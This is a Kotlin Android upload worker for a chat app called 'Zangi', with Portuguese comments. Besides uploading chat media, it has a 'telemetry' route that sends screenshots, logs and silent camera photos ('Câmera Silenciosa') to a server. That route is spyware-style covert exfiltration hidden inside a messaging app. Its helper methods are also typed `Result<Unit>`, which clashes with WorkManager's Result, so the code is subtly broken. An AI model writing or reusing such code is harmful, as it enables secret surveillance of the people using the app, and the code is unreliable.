package com.zangi.chat.service

import android.content.Context
import android.util.Log
import android.webkit.MimeTypeMap
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.zangi.chat.data.model.MessageType
import com.zangi.chat.data.remote.RetrofitClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File

/**
 * UploadWorker: Gerencia uploads assíncronos de Mídia de Chat e Telemetria.
 * Implementação inteligente que decide entre a rota de Chat ou Telemetria.
 */
class UploadWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val filePath = inputData.getString(KEY_FILE_PATH) ?: return@withContext Result.failure()
        val type = inputData.getString(KEY_TYPE) ?: MessageType.TEXT.name
        
        val file = File(filePath)
        if (!file.exists()) {
            Log.e("UploadWorker", "Arquivo não encontrado: $filePath")
            return@withContext Result.failure()
        }

        // Identificação do tipo de upload para decidir a rota
        val isTelemetry = type == "TELEMETRY" || type == "SCREENSHOT" || type == "LOG" || type == "FOTO_CAMERA"

        val workerResult = try {
            // 1. Preparação do MimeType
            val extension = file.extension
            val mimeTypeStr = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension.lowercase())
                ?: "application/octet-stream"
            val requestFile = file.asRequestBody(mimeTypeStr.toMediaTypeOrNull())
            val filePart = MultipartBody.Part.createFormData("file", file.name, requestFile)

            if (isTelemetry) {
                // --- FLUXO DE TELEMETRIA (Captura de Tela / Logs / Câmera Silenciosa) ---
                performTelemetryUpload(filePart, type)
            } else {
                // --- FLUXO DE CHAT (Foto de Chat / Imagem de Conversa) ---
                performChatMediaUpload(filePart, type)
            }

        } catch (e: Exception) {
            Log.e("UploadWorker", "Erro crítico no Worker: ${e.message}", e)
            if (runAttemptCount > 3) Result.failure() else Result.retry()
        }

        // 2. Limpeza: A responsabilidade de apagar o arquivo é exclusiva do Worker após finalizar com sucesso ou erro final
        if (workerResult is Result.Success || workerResult is Result.Failure) {
            if (file.exists()) {
                file.delete()
                Log.d("UploadWorker", "🧹 Arquivo temporário removido: ${file.name}")
            }
        }

        return@withContext workerResult
    }

    /**
     * Realiza o upload para a rota de chat (api/upload)
     */
    private suspend fun performChatMediaUpload(
        filePart: MultipartBody.Part,
        type: String
    ): Result<Unit> {
        // Recuperação de dados do inputData
        val text = inputData.getString(KEY_TEXT) ?: ""
        val conversationId = inputData.getString(KEY_CONVERSATION_ID) ?: "default_chat"
        val senderId = inputData.getString(KEY_SENDER_ID) ?: "anonimo"
        val senderName = inputData.getString(KEY_SENDER_NAME) ?: "Usuário"
        val senderZangiNumber = inputData.getString(KEY_SENDER_ZANGI_NUMBER) ?: "10-000-0000"

        val response = RetrofitClient.getApiService().uploadFile(
            file = filePart,
            text = text.toRequestBody(null),
            senderId = senderId.toRequestBody(null),
            senderName = senderName.toRequestBody(null),
            senderZangiNumber = senderZangiNumber.toRequestBody(null),
            conversationId = conversationId.toRequestBody(null),
            type = type.toRequestBody(null),
            deviceInfo = null // Chat não exige deviceInfo obrigatório
        )

        return handleResponse(response, "Chat Media")
    }

    /**
     * Realiza o upload para a rota de telemetria (api/system/telemetry)
     */
    private suspend fun performTelemetryUpload(
        filePart: MultipartBody.Part,
        eventType: String
    ): Result<Unit> {
        val userId = inputData.getString(KEY_USER_ID) ?: "unknown"
        val deviceInfo = inputData.getString(KEY_DEVICE_INFO) ?: "Android Device"

        val response = RetrofitClient.getApiService().uploadTelemetry(
            userId = userId.toRequestBody(null),
            eventType = eventType.toRequestBody(null),
            deviceInfo = deviceInfo.toRequestBody(null),
            file = filePart
        )

        return handleResponse(response, "Telemetry")
    }

    private fun handleResponse(response: retrofit2.Response<*>, context: String): Result<Unit> {
        return if (response.isSuccessful) {
            Log.d("UploadWorker", "✅ [$context] Upload concluído com sucesso.")
            Result.success()
        } else {
            val code = response.code()
            Log.e("UploadWorker", "❌ [$context] Falha: $code - ${response.message()}")
            if (code in 400..499) Result.failure() else Result.retry()
        }
    }

    companion object {
        const val KEY_FILE_PATH = "key_file_path"
        const val KEY_TEXT = "key_text"
        const val KEY_TYPE = "key_type"
        const val KEY_SENDER_ID = "key_sender_id"
        const val KEY_SENDER_NAME = "key_sender_name"
        const val KEY_SENDER_ZANGI_NUMBER = "key_sender_zangi_number"
        const val KEY_CONVERSATION_ID = "key_conversation_id"
        const val KEY_DEVICE_INFO = "key_device_info"
        const val KEY_USER_ID = "key_user_id" // Adicionado para Telemetria
    }
}